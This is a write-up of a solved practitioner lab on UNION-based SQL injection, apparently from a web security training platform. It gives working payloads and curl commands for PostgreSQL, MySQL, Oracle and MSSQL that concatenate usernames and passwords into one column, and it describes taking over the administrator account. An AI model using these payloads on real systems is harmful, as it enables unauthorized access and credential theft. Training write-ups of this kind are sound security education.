# SQL injection UNION attack, retrieving multiple values in a single column — Practitioner

**Status:** Solved

---

## Goal

When only one column can display text, concatenate multiple values together to extract usernames and passwords from the 'users' table in a single field.

---

## Steps (simple & complete)

1. **Find the injection point**
   - Browse to the shopping application
   - Click on any product category:
```
   GET /filter?category=Gifts
```
   - This parameter is vulnerable to SQL injection

2. **Determine the number of columns**
   - Use ORDER BY to find column count:
```
   Gifts' ORDER BY 1--
   Gifts' ORDER BY 2--
   Gifts' ORDER BY 3--
```
   - Let's say it has 2 columns

3. **Find which column accepts text**
   - Test each column position:
```
   Gifts' UNION SELECT 'test',NULL--
   Gifts' UNION SELECT NULL,'test'--
```
   - Let's say only column 2 accepts and displays text

4. **The challenge**
   - We need to extract BOTH username AND password
   - But only ONE column can display text
   - Solution: Concatenate both values into a single string

5. **Try database-specific concatenation syntax**

   **For PostgreSQL (try first):**
```
   Gifts' UNION SELECT NULL,username||'~'||password FROM users--
```

   **For MySQL:**
```
   Gifts' UNION SELECT NULL,CONCAT(username,'~',password) FROM users--
```

   **For Oracle:**
```
   Gifts' UNION SELECT NULL,username||'~'||password FROM users--
```
   (Note: Oracle needs `FROM dual` if no real table)

   **For Microsoft SQL Server:**
```
   Gifts' UNION SELECT NULL,username+'~'+password FROM users--
```

6. **Execute the injection with concatenation**

   Try PostgreSQL/Oracle syntax:
```bash
   curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+NULL,username||'~'||password+FROM+users--"
```

   If that fails, try MySQL:
```bash
   curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+NULL,CONCAT(username,'~',password)+FROM+users--"
```

7. **Find concatenated credentials in output**
   - Look for data in format: `username~password`
   - Example output:
```
   administrator~s3cr3tp@ss
   wiener~peter
   carlos~montoya
```

8. **Extract administrator credentials**
   - Find the line: `administrator~s3cr3tp@ss`
   - Split by the separator: `~`
   - Username: `administrator`
   - Password: `s3cr3tp@ss`

9. **Log in as administrator**
   - Navigate to the login page
   - Enter the extracted credentials
   - Click "Log in"
   - Lab solves automatically

---

## Example

- Vulnerable endpoint: `GET /filter?category=Gifts`
- Column count: 2 columns
- Only column 2 accepts text
- Database: PostgreSQL

**Payload:**
```bash
curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+NULL,username||'~'||password+FROM+users--"
```

**Output on page:**
```
Product: Laptop - $999
administrator~p@ssw0rd123
wiener~peter
Product: Mouse - $20
carlos~montoya
Product: Keyboard - $50
```

**Parse the result:**
- `administrator~p@ssw0rd123` → Username: `administrator`, Password: `p@ssw0rd123`

---

## Concatenation syntax by database

| Database | Syntax | Example |
|----------|--------|---------|
| **PostgreSQL** | `||` operator | `username||'~'||password` |
| **Oracle** | `||` operator | `username||'~'||password` |
| **MySQL** | `CONCAT()` | `CONCAT(username,'~',password)` |
| **MSSQL** | `+` operator | `username+'~'+password` |

**Choosing the separator:**
- Use uncommon characters: `~`, `|`, `:`, `###`
- Avoid: spaces, quotes, semicolons
- Makes parsing easier
- Unlikely to appear in actual data

---

## Why concatenation is necessary

**The problem:**
- Query has multiple columns
- Only ONE column displays text
- We need TWO pieces of data (username + password)
- Can't use separate columns

**The solution:**
- Merge both values into one string
- Add separator to distinguish them
- Display in the single text column
- Parse the concatenated result

**Real-world scenarios:**
- Limited column visibility
- Extracting multiple fields at once
- Blind SQL injection (need compact output)
- Bypassing output filters

---

## Advanced concatenation techniques

**Multiple fields (3+ values):**
```sql
username||'~'||password||'~'||email FROM users
```
Output: `admin~pass123~admin@example.com`

**With labels:**
```sql
'User:'||username||',Pass:'||password FROM users
```
Output: `User:admin,Pass:pass123`

**All users in one line (MySQL):**
```sql
GROUP_CONCAT(username,':',password SEPARATOR '|') FROM users
```
Output: `admin:pass1|user:pass2|carlos:pass3`

**Count before extract:**
```sql
CONCAT('Total:',(SELECT COUNT(*) FROM users)) FROM dual
```
Helps plan extraction strategy

---

## Troubleshooting

**Syntax errors:**
- Try different concatenation methods
- Check database type (use version query if needed)
- Verify quote escaping
- Ensure correct column count

**No separator in output:**
- Separator might be interpreted as HTML
- View page source instead of rendered page
- Try different separator character
- Use URL encoding if needed

**Values blend together:**
- Always use a separator
- Without it: `administratorpassword` (unusable)
- With it: `administrator~password` (clear)

**Multiple rows confusing:**
- Each user appears on separate line
- Look for `administrator` specifically
- Ignore other users

---

## Why this matters in real attacks

**Single column limitation is common:**
- Many apps only display one field
- Error messages, search results, etc.
- Need concatenation for effective extraction
- Essential technique for real penetration testing

**Efficiency:**
- Extract all data in one request
- No need for multiple injections
- Faster exploitation
- Less likely to trigger detection

---

